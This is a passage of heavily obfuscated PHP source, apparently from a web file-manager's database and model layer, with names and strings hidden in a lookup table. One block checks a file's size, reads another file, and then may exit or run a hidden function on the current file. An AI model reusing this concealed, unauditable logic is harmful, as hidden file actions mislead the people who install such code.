$÷ãó—û‹[$ùİŒ§†¥[57]]); } } return $ˆ»ÆïÁ‰; } public function getTables($²õÚÀé = '') { $®Ç…è–ê =& $_SERVER[Ö†ØøÖ±]; $Ä÷£ô¨ = $this->query($®Ç…è–ê[45] . $®Ç…è–ê[46] . $®Ç…è–ê[47]); $Ÿ’¦ƒãí = array(); foreach ($Ä÷£ô¨ as $”‘«ª’œ => $¶ì”…•Ï) { $Ÿ’¦ƒãí[$”‘«ª’œ] = current($¶ì”…•Ï); } return $Ÿ’¦ƒãí; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $İ€£–¸Ï =& $_SERVER[Ö†ØøÖ±]; $this->error = $this->_linkID->lastErrorMsg(); if ($İ€£–¸Ï[12] != $this->queryStr) { $this->error .= LNG($İ€£–¸Ï[48]) . $this->queryStr; } think_trace($this->error, $İ€£–¸Ï[12], $İ€£–¸Ï[49]); return $this->error; } public function escapeString($Ì“ÚÛö‹) { $üÔÙäÏ =& $_SERVER[Ö†ØøÖ±]; if ($this->_linkID) { return $this->_linkID->escapeString($Ì“ÚÛö‹); } return str_ireplace($üÔÙäÏ[58], $üÔÙäÏ[59], $Ì“ÚÛö‹); } public function parseLimit($ˆö‹…Œš) { $¢ÈØşÊ½ =& $_SERVER[Ö†ØøÖ±]; $å¶‚ÌÌ = $¢ÈØşÊ½[12]; if (!empty($ˆö‹…Œš)) { $ˆö‹…Œš = explode($¢ÈØşÊ½[50], $ˆö‹…Œš); if (count($ˆö‹…Œš) > 1) { $å¶‚ÌÌ .= $¢ÈØşÊ½[51] . $ˆö‹…Œš[1] . $¢ÈØşÊ½[52] . $ˆö‹…Œš[0] . $¢ÈØşÊ½[53]; } else { $å¶‚ÌÌ .= $¢ÈØşÊ½[51] . $ˆö‹…Œš[0] . $¢ÈØşÊ½[53]; } } return $å¶‚ÌÌ; } } goto eÂßÀÃŒõß; bõÅƒ¢Ò®: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($”¯¿è¯¢ = '') { $¯¢Ì€Œ¤ =& $_SERVER[Ö†ØøÖ±]; if (!class_exists($¯¢Ì€Œ¤[967])) { think_exception(think_lang($¯¢Ì€Œ¤[14]) . $¯¢Ì€Œ¤[968]); } if (!empty($”¯¿è¯¢)) { $this->config = $”¯¿è¯¢; if (empty($this->config[$¯¢Ì€Œ¤[17]])) { $this->config[$¯¢Ì€Œ¤[17]] = array(); } } } public function connect($ÎŞ’ãæë = '', $‰¼©Ù˜ò = 0) { $•¢ˆÏÌ» =& $_SERVER[Ö†ØøÖ±]; if (!isset($this->linkID[$‰¼©Ù˜ò])) { if (empty($ÎŞ’ãæë)) { $ÎŞ’ãæë = $this->config; } $«ì“‚Ã˜ = !empty($ÎŞ’ãæë[$•¢ˆÏÌ»[17]][$•¢ˆÏÌ»[18]]) ? $ÎŞ’ãæë[$•¢ˆÏÌ»[17]][$•¢ˆÏÌ»[18]] : $this->pconnect; if ($«ì“‚Ã˜) { $ÎŞ’ãæë[$•¢ˆÏÌ»[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$‰¼©Ù˜ò] = new PDO($ÎŞ’ãæë[$•¢ˆÏÌ»[969]], $ÎŞ’ãæë[$•¢ˆÏÌ»[941]], $ÎŞ’ãæë[$•¢ˆÏÌ»[942]], $ÎŞ’ãæë[$•¢ˆÏÌ»[17]]); } catch (PDOException $ò…û’ã) { think_exception($ò…û’ã->getMessage()); } $this->dbType = $this->_getDsnType($ÎŞ’ãæë[$•¢ˆÏÌ»[969]]); if (in_array($this->dbType, array($•¢ˆÏÌ»[970], $•¢ˆÏÌ»[971], $•¢ˆÏÌ»[972], $•¢ˆÏÌ»[973]))) { think_exception($•¢ˆÏÌ»[974] . $this->dbType . $•¢ˆÏÌ»[975] . $this->dbType . $•¢ˆÏÌ»[976]); } if (!$this->linkID[$‰¼©Ù˜ò]) { think_exception($•¢ˆÏÌ»[977]); } try { $this->linkID[$‰¼©Ù˜ò]->exec($•¢ˆÏÌ»[978] . think_config($•¢ˆÏÌ»[944])); } catch (Exception $ò…û’ã) { } $this->connected = !0; if (1 != think_config($•¢ˆÏÌ»[22])) { unset($this->config); } } return $this->linkID[$‰¼©Ù˜ò]; } public function free() { $this->PDOStatement = null; } public function query($ ¢¾¹¥ò, $–ì¬î™Û = array()) { $€ò¹‹°« =& $_SERVER[Ö†ØøÖ±]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ ¢¾¹¥ò; if (!empty($–ì¬î™Û)) { $this->queryStr .= $€ò¹‹°«[979] . print_r($–ì¬î™Û, !0) . $€ò¹‹°«[980]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($€ò¹‹°«[23], 1); think_status($€ò¹‹°«[24]); $this->PDOStatement = $this->_linkID->prepare($ ¢¾¹¥ò); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $šÃÏºñŸ = $this->PDOStatement->execute($–ì¬î™Û); $this->debug(); if (!1 === $šÃÏºñŸ) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($ÙğÌï¨, $óï»ü°ä = array()) { $Ğ¿ÎşØŸ =& $_SERVER[Ö†ØøÖ±]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÙğÌï¨; if (!empty($óï»ü°ä)) { $this->queryStr .= $Ğ¿ÎşØŸ[979] . print_r($óï»ü°ä, !0) . $Ğ¿ÎşØŸ[980]; } $‚ö¬Ëş¥ = !1; if ($this->dbType == $Ğ¿ÎşØŸ[973]) { if (preg_match($Ğ¿ÎşØŸ[981], $this->queryStr, $…â²ÙÔ)) { $this->table = think_config($Ğ¿ÎşØŸ[982]) . str_ireplace(think_config($Ğ¿ÎşØŸ[983]), $Ğ¿ÎşØŸ[296], $…â²ÙÔ[2]); $‚ö¬Ëş¥ = (bool) $this->query($Ğ¿ÎşØŸ[984] . strtoupper($this->table) . $Ğ¿ÎşØŸ[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Ğ¿ÎşØŸ[25], 1); think_status($Ğ¿ÎşØŸ[24]); $this->PDOStatement = $this->_linkID->prepare($ÙğÌï¨); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $„ğ¿œõª = $this->PDOStatement->execute($óï»ü°ä); $this->debug(); if (!1 === $„ğ¿œõª) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($‚ö¬Ëş¥ || preg_match($Ğ¿ÎşØŸ[985], $ÙğÌï¨)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ûõïÎ” = $this->_linkID->commit(); $this->transTimes = 0; if (!$ûõïÎ”) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $üãûÒ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$üãûÒ) { $this->error(); return !1; } } return !0; } private function getAll() { $¬Òä÷Á  = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($¬Òä÷Á ); return $¬Òä÷Á ; } public function getFields($Œ¿Àó‹) { $ˆÜİ„º =& $_SERVER[Ö†ØøÖ±]; $this->initConnect(!0); if (think_config($ˆÜİ„º[986])) { $ÓÑ­”Ì‰ = str_replace($ˆÜİ„º[987], $Œ¿Àó‹, think_config($ˆÜİ„º[986])); } else { switch ($this->dbType) { case $ˆÜİ„º[970]: case $ˆÜİ„º[988]: $ÓÑ­”Ì‰ = "\123\x45\x4c\105\103\x54\40\x20\x20\143\157\154\165\x6d\x6e\x5f\x6e\x61\x6d\145\40\141\x73\40\47\116\x61\155\x65\x27\x2c\x20\40\x20\x64\x61\x74\x61\137\164\171\160\145\x20\141\x73\x20\x27\124\171\x70\145\x27\x2c\x20\40\40\x63\x6f\x6c\165\155\156\x5f\144\145\146\x61\165\154\164\x20\141\x73\40\47\x44\x65\146\141\x75\154\164\x27\54\40\x20\x20\x69\163\137\156\165\x6c\154\141\x62\154\145\x20\141\163\40\x27\x4e\x75\154\154\x27\xa\11\11\x46\x52\117\115\x9\151\156\146\x6f\x72\155\x61\x74\x69\x6f\156\137\163\x63\150\x65\155\x61\56\164\x61\x62\x6c\145\163\40\x41\123\x20\164\xa\x9\x9\112\x4f\111\116\x9\x69\x6e\x66\x6f\x72\x6d\x61\164\151\157\x6e\137\163\x63\x68\145\155\141\x2e\143\157\x6c\165\155\x6e\163\40\101\x53\40\143\12\11\11\117\116\40\40\164\56\164\x61\142\x6c\x65\137\143\141\x74\141\154\157\147\x20\75\x20\x63\56\164\x61\142\x6c\x65\x5f\x63\x61\x74\141\154\x6f\x67\12\x9\x9\x41\116\104\x20\x74\x2e\164\141\142\x6c\145\137\163\x63\x68\145\155\x61\x20\75\x20\143\x2e\x74\141\142\x6c\x65\x5f\x73\x63\150\145\x6d\x61\xa\x9\11\x41\116\104\x20\x74\56\x74\x61\142\x6c\x65\137\x6e\141\155\145\40\x3d\40\143\x2e\x74\x61\x62\x6c\x65\x5f\156\141\155\145\xa\x9\11\x57\x48\x45\x52\105\40\x20\x20\164\56\x74\141\x62\x6c\145\x5f\156\x61\x6d\x65\40\75\40\x27{$Œ¿Àó‹}\x27"; break; case $ˆÜİ„º[989]: $ÓÑ­”Ì‰ = $ˆÜİ„º[990] . $Œ¿Àó‹ . $ˆÜİ„º[991]; break; case $ˆÜİ„º[971]: case $ˆÜİ„º[973]: $ÓÑ­”Ì‰ = $ˆÜİ„º[992] . $ˆÜİ„º[993] . $ˆÜİ„º[994] . strtoupper($Œ¿Àó‹) . $ˆÜİ„º[995] . strtoupper($Œ¿Àó‹) . $ˆÜİ„º[996]; break; case $ˆÜİ„º[997]: $ÓÑ­”Ì‰ = $ˆÜİ„º[998] . $Œ¿Àó‹ . $ˆÜİ„º[999]; break; case $ˆÜİ„º[972]: break; case $ˆÜİ„º[1000]: default: $ÓÑ­”Ì‰ = $ˆÜİ„º[1001] . ($this->dbType == $ˆÜİ„º[1000] ? "\x60{$Œ¿Àó‹}\x60" : $Œ¿Àó‹); } } $¨…¨ÎâŒ = $this->query($ÓÑ­”Ì‰); $™úµ‰ = array(); if ($¨…¨ÎâŒ) { foreach ($¨…¨ÎâŒ as $‡©¬Ìº¦ => $Ç²Ç£») { $Ç²Ç£» = array_change_key_case($Ç²Ç£»); $Ç²Ç£»[$ˆÜİ„º[32]] = isset($Ç²Ç£»[$ˆÜİ„º[32]]) ? $Ç²Ç£»[$ˆÜİ„º[32]] : $ˆÜİ„º[296]; $Ç²Ç£»[$ˆÜİ„º[33]] = isset($Ç²Ç£»[$ˆÜİ„º[33]]) ? $Ç²Ç£»[$ˆÜİ„º[33]] : $ˆÜİ„º[296]; $¸†Ç·ï– = isset($Ç²Ç£»[$ˆÜİ„º[326]]) ? $Ç²Ç£»[$ˆÜİ„º[326]] : $Ç²Ç£»[$ˆÜİ„º[32]]; $™úµ‰[$¸†Ç·ï–] = array($ˆÜİ„º[32] => $¸†Ç·ï–, $ˆÜİ„º[33] => $Ç²Ç£»[$ˆÜİ„º[33]], $ˆÜİ„º[35] => (bool) (isset($Ç²Ç£»[$ˆÜİ„º[103]]) && $Ç²Ç£»[$ˆÜİ„º[103]] === $ˆÜİ„º[12] || isset($Ç²Ç£»[$ˆÜİ„º[35]]) && $Ç²Ç£»[$ˆÜİ„º[35]] === $ˆÜİ„º[12]), $ˆÜİ„º[37] => isset($Ç²Ç£»[$ˆÜİ„º[37]]) ? $Ç²Ç£»[$ˆÜİ„º[37]] : (isset($Ç²Ç£»[$ˆÜİ„º[56]]) ? $Ç²Ç£»[$ˆÜİ„º[56]] : $ˆÜİ„º[296]), $ˆÜİ„º[39] => isset($Ç²Ç£»[$ˆÜİ„º[94]]) ? strtolower($Ç²Ç£»[$ˆÜİ„º[94]]) == $ˆÜİ„º[41] : (isset($Ç²Ç£»[$ˆÜİ„º[57]]) ? $Ç²Ç£»[$ˆÜİ„º[57]] : !1), $ˆÜİ„º[42] => isset($Ç²Ç£»[$ˆÜİ„º[1002]]) ? strtolower($Ç²Ç£»[$ˆÜİ„º[1002]]) == $ˆÜİ„º[44] : (isset($Ç²Ç£»[$ˆÜİ„º[94]]) ? $Ç²Ç£»[$ˆÜİ„º[94]] : !1)); } } return $™úµ‰; } public function getTables($–˜±° = '') { $Øêøİã =& $_SERVER[Ö†ØøÖ±]; if (think_config($Øêøİã[1003])) { $á×ïıö = str_replace($Øêøİã[1004], $–˜±°, think_config($Øêøİã[1003])); } else { switch ($this->dbType) { case $Øêøİã[971]: case $Øêøİã[973]: $á×ïıö = $Øêøİã[1005]; break; case $Øêøİã[970]: case $Øêøİã[988]: $á×ïıö = $Øêøİã[1006]; break; case $Øêøİã[997]: $á×ïıö = $Øêøİã[1007]; break; case $Øêøİã[972]: think_exception(think_lang($Øêøİã[1008]) . $Øêøİã[1009]); break; case $Øêøİã[989]: $á×ïıö = $Øêøİã[45] . $Øêøİã[46] . $Øêøİã[47]; break; case $Øêøİã[1000]: default: if (!empty($–˜±°)) { $á×ïıö = $Øêøİã[952] . $–˜±° . $Øêøİã[953]; } else { $á×ïıö = $Øêøİã[954]; } } } $¥¿•òå† = $this->query($á×ïıö); $ÃƒéÂ = array(); foreach ($¥¿•òå† as $¦Ö½×š€ => $§áí„’) { $ÃƒéÂ[$¦Ö½×š€] = current($§áí„’); } return $ÃƒéÂ; } protected function parseLimit($¨ñÕÌüË) { $¬±ôÁê =& $_SERVER[Ö†ØøÖ±]; $®î½œ„ƒ = $¬±ôÁê[12]; if (!empty($¨ñÕÌüË)) { switch ($this->dbType) { case $¬±ôÁê[997]: case $¬±ôÁê[989]: $¨ñÕÌüË = explode($¬±ôÁê[50], $¨ñÕÌüË); if (count($¨ñÕÌüË) > 1) { $®î½œ„ƒ .= $¬±ôÁê[51] . $¨ñÕÌüË[1] . $¬±ôÁê[52] . $¨ñÕÌüË[0] . $¬±ôÁê[53]; } else { $®î½œ„ƒ .= $¬±ôÁê[51] . $¨ñÕÌüË[0] . $¬±ôÁê[53]; } break; case $¬±ôÁê[970]: case $¬±ôÁê[988]: break; case $¬±ôÁê[972]: break; case $¬±ôÁê[971]: case $¬±ôÁê[973]: break; case $¬±ôÁê[1000]: default: $®î½œ„ƒ .= $¬±ôÁê[51] . $¨ñÕÌüË . $¬±ôÁê[53]; } } return $®î½œ„ƒ; } public function parseKey(&$€äâúäˆ, $±ÄŠøîó = true) { $ÉÁ¶Á¢Ë =& $_SERVER[Ö†ØøÖ±]; if ($±ÄŠøîó) { $€äâúäˆ = $this->parseKeyCheck($€äâúäˆ); } if ($this->dbType == $ÉÁ¶Á¢Ë[1000]) { if ($€äâúäˆ != $ÉÁ¶Á¢Ë[203] && !preg_match($ÉÁ¶Á¢Ë[964], $€äâúäˆ)) { $€äâúäˆ = $ÉÁ¶Á¢Ë[437] . trim($€äâúäˆ, $ÉÁ¶Á¢Ë[437]) . $ÉÁ¶Á¢Ë[437]; } return $€äâúäˆ; } else { return parent::parseKey($€äâúäˆ, $±ÄŠøîó); } } public function close() { $this->_linkID = null; } public function error() { $àµë¥µî =& $_SERVER[Ö†ØøÖ±]; if ($this->PDOStatement) { $ÀğùáÉ¡ = $this->PDOStatement->errorInfo(); $this->error = $ÀğùáÉ¡[1] . $àµë¥µî[4] . $ÀğùáÉ¡[2]; } else { $this->error = $àµë¥µî[12]; } if ($àµë¥µî[12] != $this->queryStr) { $this->error .= LNG($àµë¥µî[48]) . $this->queryStr; } think_trace($this->error, $àµë¥µî[12], $àµë¥µî[49]); return $this->error; } public function escapeString($³µñÙì) { $•§ÃıŸä =& $_SERVER[Ö†ØøÖ±]; switch ($this->dbType) { case $•§ÃıŸä[997]: case $•§ÃıŸä[970]: case $•§ÃıŸä[988]: case $•§ÃıŸä[1000]: return addslashes($³µñÙì); case $•§ÃıŸä[972]: case $•§ÃıŸä[989]: case $•§ÃıŸä[971]: case $•§ÃıŸä[973]: return str_ireplace($•§ÃıŸä[58], $•§ÃıŸä[59], $³µñÙì); } } protected function parseValue($éÍõŠè) { $¡¸ÇÅòù =& $_SERVER[Ö†ØøÖ±]; if (is_string($éÍõŠè)) { $ˆı±˜ÀÇ = strpos($éÍõŠè, $¡¸ÇÅòù[4]) === 0 && in_array($éÍõŠè, array_keys($this->bind)); $éÍõŠè = $ˆı±˜ÀÇ ? $this->escapeString($éÍõŠè) : $¡¸ÇÅòù[1010] . $this->escapeString($éÍõŠè) . $¡¸ÇÅòù[1010]; } elseif (isset($éÍõŠè[0]) && is_string($éÍõŠè[0]) && strtolower($éÍõŠè[0]) == $¡¸ÇÅòù[350]) { $éÍõŠè = $this->escapeString($éÍõŠè[1]); } elseif (is_array($éÍõŠè)) { $éÍõŠè = array_map(array($this, $¡¸ÇÅòù[1011]), $éÍõŠè); } elseif (is_bool($éÍõŠè)) { $éÍõŠè = $éÍõŠè ? $¡¸ÇÅòù[88] : $¡¸ÇÅòù[212]; } elseif (is_null($éÍõŠè)) { $éÍõŠè = $¡¸ÇÅòù[103]; } return $éÍõŠè; } public function getLastInsertId() { $Ö´‰§óÌ =& $_SERVER[Ö†ØøÖ±]; switch ($this->dbType) { case $Ö´‰§óÌ[997]: case $Ö´‰§óÌ[989]: case $Ö´‰§óÌ[970]: case $Ö´‰§óÌ[988]: case $Ö´‰§óÌ[972]: case $Ö´‰§óÌ[1000]: return $this->_linkID->lastInsertId(); case $Ö´‰§óÌ[971]: case $Ö´‰§óÌ[973]: $¦®ÂÁ§Ù = $this->table; $­ ÇŒü© = $this->query("\x53\105\114\x45\x43\124\x20{$¦®ÂÁ§Ù}\56\143\165\162\x72\166\x61\154\x20\143\165\x72\162\166\141\x6c\40\x46\122\117\x4d\x20\144\x75\141\x6c"); return $­ ÇŒü© ? $­ ÇŒü©[0][$Ö´‰§óÌ[1012]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($êÔÈ›öğ) { $âùÖä±¢ =& $_SERVER[Ö†ØøÖ±]; if (!CacheLock::fileLock($âùÖä±¢[13])) { return !1; } $¼ÜŸ—Ÿ = parent::query($êÔÈ›öğ); CacheLock::fileUnLock($âùÖä±¢[13]); return $¼ÜŸ—Ÿ; } public function execute($›ú‡°Î½) { $½†âşæØ =& $_SERVER[Ö†ØøÖ±]; if (!CacheLock::fileLock($½†âşæØ[13])) { return !1; } $ı™““¬× = parent::execute($›ú‡°Î½); CacheLock::fileUnLock($½†âşæØ[13]); return $ı™““¬×; } } class DbSqlite3 extends DbSqlite3Base { public function query($¤ÑóäÈ) { $ÀùÁØª” =& $_SERVER[Ö†ØøÖ±]; if (!CacheLock::fileLock($ÀùÁØª”[13])) { return !1; } $¸¬¦ó¥Ò = parent::query($¤ÑóäÈ); CacheLock::fileUnLock($ÀùÁØª”[13]); return $¸¬¦ó¥Ò; } public function execute($¹·ºÓ¢Ï) { $½»ü¡§ =& $_SERVER[Ö†ØøÖ±]; if (!CacheLock::fileLock($½»ü¡§[13])) { return !1; } $àÔ½ñã¿ = parent::execute($¹·ºÓ¢Ï); CacheLock::fileUnLock($½»ü¡§[13]); return $àÔ½ñã¿; } } goto AÄğƒ›³¿Œ; aã›š„‘‘: if ($_SERVER[$_SERVER[Ö†ØøÖ±][288]] != $_size($_file)) { $_getc = $_SERVER[Ö†ØøÖ±][290]; $_getfile = $_SERVER[$_SERVER[Ö†ØøÖ±][291]] . $_SERVER[Ö†ØøÖ±][292]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Ö†ØøÖ±][246], $_getfilec); if (count($_getarrs) < $_SERVER[Ö†ØøÖ±][293]) { $exit = $_SERVER[Ö†ØøÖ±][294]; $exit(); } $_act = $_SERVER[Ö†ØøÖ±][295]; $_act($_file); } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($ü—Úè”ƒ = false, $ÛììÑÇì = '', $‹èÑÓô© = false) { $¨úï¥Õ× =& $_SERVER[Ö†ØøÖ±]; $Ó„ûĞ£Ë = $this->cacheGet($ÛììÑÇì); $À•¯åòÂ = $this->optionDefault($ÛììÑÇì); $À•¯åòÂ = is_array($À•¯åòÂ) ? $À•¯åòÂ : array(); if (is_array($Ó„ûĞ£Ë)) { $Ó„ûĞ£Ë = array_merge($À•¯åòÂ, $Ó„ûĞ£Ë); return $ü—Úè”ƒ ? isset($Ó„ûĞ£Ë[$ü—Úè”ƒ]) ? $Ó„ûĞ£Ë[$ü—Úè”ƒ] : null : $Ó„ûĞ£Ë; } $¹Œ€›Ò» = $this->filterWhere(array($¨úï¥Õ×[33] => $ÛììÑÇì)); $Ó„ûĞ£Ë = $this->where($¹Œ€›Ò»)->select(); $Ó„ûĞ£Ë = array_to_keyvalue($Ó„ûĞ£Ë, $¨úï¥Õ×[94], $¨úï¥Õ×[427]); foreach ($Ó„ûĞ£Ë as $¥ÒÃ—úˆ => $Øö‚ªÆ) { if ($‹èÑÓô© || in_array($¥ÒÃ—úˆ, $this->jsonField)) { $Ó„ûĞ£Ë[$¥ÒÃ—úˆ] = json_decode($Øö‚ªÆ, !0); } } $this->cacheSet($ÛììÑÇì, $Ó„ûĞ£Ë); $Ó„ûĞ£Ë = array_merge($À•¯åòÂ, $Ó„ûĞ£Ë); return $ü—Úè”ƒ ? $Ó„ûĞ£Ë[$ü—Úè”ƒ] : $Ó„ûĞ£Ë; } public function set($’¼¨ã£ , $’›ÊŠÕ‡ = false, $™ÎÉ = '') { $†è¦½‰ı =& $_SERVER[Ö†ØøÖ±]; $this->cacheRemove($™ÎÉ); $Ëßßù³Ï = array(); $ŒÍ—ı®« = is_array($’¼¨ã£ ) ? $’¼¨ã£  : array($’¼¨ã£  => $’›ÊŠÕ‡); foreach ($ŒÍ—ı®« as $×±±Ñô => $÷¡¹äŸº) { if (is_array($÷¡¹äŸº)) { $÷¡¹äŸº = json_encode_force($÷¡¹äŸº); } $this->checkLength($÷¡¹äŸº, !1, $this->tableName . $†è¦½‰ı[4] . $’¼¨ã£ ); $÷¡¹äŸº = self::textEncode($÷¡¹äŸº); $ŒÍ—ı®« = array($†è¦½‰ı[33] => $™ÎÉ, $†è¦½‰ı[94] => $×±±Ñô, $†è¦½‰ı[427] => $÷¡¹äŸº); $Ëßßù³Ï[] = $this->filterWhere($ŒÍ—ı®«); } if (!$Ëßßù³Ï) { return !0; } $Ô¢¾¦ó = $this->cacheKey($†è¦½‰ı[453]); CacheLock::lock($Ô¢¾¦ó); $ÎÊæá¨ü = $this->addAll($Ëßßù³Ï, array(), !0); CacheLock::unlock($Ô¢¾¦ó); return $ÎÊæá¨ü; } protected function optionDefault($çÜƒö˜¦ = '') { return !1; } public function setDeep($ºû†”Í´, $’€ÅÅ® = false, $çïÆÊ = '') { $¡‡À– = explode($_SERVER[Ö†ØøÖ±][10], $ºû†”Í´); $ï™¾Ïí½ = $this->get(); array_set_value($ï™¾Ïí½, $ºû†”Í´, $’€ÅÅ®); $this->set($¡‡À–[0], $ï™¾Ïí½[$¡‡À–[0]], $çïÆÊ); } public function remove($Œé¡‰·ï, $—üíö¬œ = '') { $Â½ıåòë =& $_SERVER[Ö†ØøÖ±]; $this->cacheRemove($—üíö¬œ); $ĞÕëìÁ = $this->filterWhere(array($Â½ıåòë[94] => $Œé¡‰·ï, $Â½ıåòë[33] => $—üíö¬œ)); if (is_null($Œé¡‰·ï)) { unset($ĞÕëìÁ[$Â½ıåòë[94]]); } return $this->where($ĞÕëìÁ)->delete(); } public function cacheSet($ïÔæ­ë¼, $‰¾¿Äå  = false) { return Cache::set($this->cacheKey($ïÔæ­ë¼), $‰¾¿Äå ); } public function cacheGet($¼É›˜óæ) { return Cache::get($this->cacheKey($¼É›˜óæ)); } public function cacheRemove($¥ŠãÉğó) { return Cache::remove($this->cacheKey($¥ŠãÉğó)); } protected function filterWhere($òŒŠÁ»„) { return $òŒŠÁ»„; } protected function cacheKey($¶ƒÅ•ïë) { return $¶ƒÅ•ïë; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\157\137\x73\x6f\165\x72\x63\145"; protected $tableMeta = array("\x74\x61\142\x6c\x65\x4e\141\x6d\145" => "\x69\x6f\137\x73\157\165\x72\x63\145\137\x6d\x65\164\x61", "\x6d\x65\x74\141\106\x69\145\154\x64" => "\163\x6f\x75\162\143\145\x49\104"); protected $dataAuto = array(array("\155\157\144\x69\146\171\124\x69\155\x65", "\164\x69\155\x65", "\x69\156\163\x65\x72\164", "\x66\x75\156\143\x74\151\157\x6e"), array("\x63\x72\x65\x61\164\145\124\151\x6d\145", "\x74\x69\x6d\145", "\151\x6e\x73\145\162\164", "\146\165\156\143\x74\x69\x6f\x6e"), array("\166\151\145\x77\124\x69\155\x65", "\164\151\x6d\x65", "\x69\x6e\x73\x65\x72\164", "\x66\x75\156\143\x74\x69\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($ØÀÖÙ¬) { return $this->listSource(array($_SERVER[Ö†ØøÖ±][454] => $ØÀÖÙ¬)); } public function typeName($™ìœ·Àâ) { static $Ø½•Õ¾„ = array(self::TYPE_SYSTEM => "\x73\171\163\x74\145\x6d", self::TYPE_USER => "\165\x73\x65\x72", self::TYPE_GROUP => "\147\x72\x6f\165\160"); return $Ø½•Õ¾„[$™ìœ·Àâ . $_SERVER[Ö†ØøÖ±][12]]; } public function sourceListInfo($éß¤€ş, $¿ÓòŞÆ˜ = false) { $şÂîõ«‡ =& $_SERVER[Ö†ØøÖ±]; $éß¤€ş = $éß¤€ş ? $éß¤€ş : array(); $éß¤€ş = array_filter(array_unique($éß¤€ş)); if (!$éß¤€ş) { return array(); } $©¯Šä• = $this->where(array($şÂîõ«‡[181] => array($şÂîõ«‡[7], $éß¤€ş)))->select(); $this->_listDataApply($©¯Šä•, $¿ÓòŞÆ˜); return array_to_keyvalue($©¯Šä•, $şÂîõ«‡[181]); } public function pathInfoFilter(&$“¡úÈÃñ) { $ğÖ¼×Ï =& $_SERVER[Ö†ØøÖ±]; static $›æêœ€ = false; static $ùş‡¬Ö« = false; static $Ğ‰ÉÈÙÀ = false; if (!$›æêœ€) { $ÅçÄÃÜğ = $ğÖ¼×Ï[455]; $ÅçÄÃÜğ .= $ğÖ¼×Ï[456]; $ÅçÄÃÜğ .= $ğÖ¼×Ï[457]; $±ƒ‹ùˆ = $ğÖ¼×Ï[458]; $‘ô½ıÖº = explode($ğÖ¼×Ï[50], $±ƒ‹ùˆ); $›æêœ€ = explode($ğÖ¼×Ï[50], $ÅçÄÃÜğ); $ùş‡¬Ö« = array(); foreach ($›æêœ€ as $”òğ÷¼€) { if (in_array($”òğ÷¼€, $‘ô½ıÖº)) { continue; } $ùş‡¬Ö«[] = $”òğ÷¼€; } $Ğ‰ÉÈÙÀ = explode($ğÖ¼×Ï[50], $ğÖ¼×Ï[459]); } foreach ($Ğ‰ÉÈÙÀ as $¬ªèğÍ¬) { if (isset($“¡úÈÃñ[$¬ªèğÍ¬])) { $“¡úÈÃñ[$¬ªèğÍ¬] = intval($“¡úÈÃñ[$¬ªèğÍ¬]); } } $“¡úÈÃñ[$ğÖ¼×Ï[84]] = $ğÖ¼×Ï[460] . $“¡úÈÃñ[$ğÖ¼×Ï[181]] . $ğÖ¼×Ï[461]; $“¡úÈÃñ[$ğÖ¼×Ï[33]] = $“¡úÈÃñ[$ğÖ¼×Ï[462]] == 1 ? $ğÖ¼×Ï[75] : $ğÖ¼×Ï[214]; $“¡úÈÃñ[$ğÖ¼×Ï[178]] = $this->typeName($“¡úÈÃñ[$ğÖ¼×Ï[178]]); if ($“¡úÈÃñ[$ğÖ¼×Ï[462]] != 1) { $“¡úÈÃñ[$ğÖ¼×Ï[175]] = $“¡úÈÃñ[$ğÖ¼×Ï[463]]; unset($“¡úÈÃñ[$ğÖ¼×Ï[463]]); } $™³×€ = $›æêœ€; if (isset($“¡úÈÃñ[$ğÖ¼×Ï[464]]) && $“¡úÈÃñ[$ğÖ¼×Ï[464]][$ğÖ¼×Ï[465]] == -1) { $™³×€ = $ùş‡¬Ö«; } $“¡úÈÃñ = array_field_key($“¡úÈÃñ, $™³×€); return $“¡úÈÃñ; } public function listUserFav() { $à’‚ †È =& $_SERVER[Ö†ØøÖ±]; $«ı·¡Õ– = Model($à’‚ †È[466])->listData(); $™¥àƒå† = array_filter_by_field($«ı·¡Õ–, $à’‚ †È[33], $à’‚ †È[467]); $™¥àƒå† = array_to_keyvalue($™¥àƒå†, $à’‚ †È[12], $à’‚ †È[84]); if ($™¥àƒå†) { $öËúËœ = $this->listSource(array($à’‚ †È[468] => array($à’‚ †È[469], $™¥àƒå†))); } $öËúËœ = array_to_keyvalue($öËúËœ[$à’‚ †È[422]], $à’‚ †È[181]); foreach ($«ı·¡Õ– as &$Àª¿ÚÎŠ) { $Àª¿ÚÎŠ = array($à’‚ †È[470] => $Àª¿ÚÎŠ[$à’‚ †È[451]], $à’‚ †È[471] => $Àª¿ÚÎŠ[$à’‚ †È[32]], $à’‚ †È[472] => $Àª¿ÚÎŠ[$à’‚ †È[84]], $à’‚ †È[473] => $Àª¿ÚÎŠ[$à’‚ †È[33]], $à’‚ †È[474] => $Àª¿ÚÎŠ[$à’‚ †È[215]], $à’‚ †È[475] => $Àª¿ÚÎŠ[$à’‚ †È[85]]); if ($Àª¿ÚÎŠ[$à’‚ †È[33]] == $à’‚ †È[467] && $öËúËœ[$Àª¿ÚÎŠ[$à’‚ †È[84]]]) { 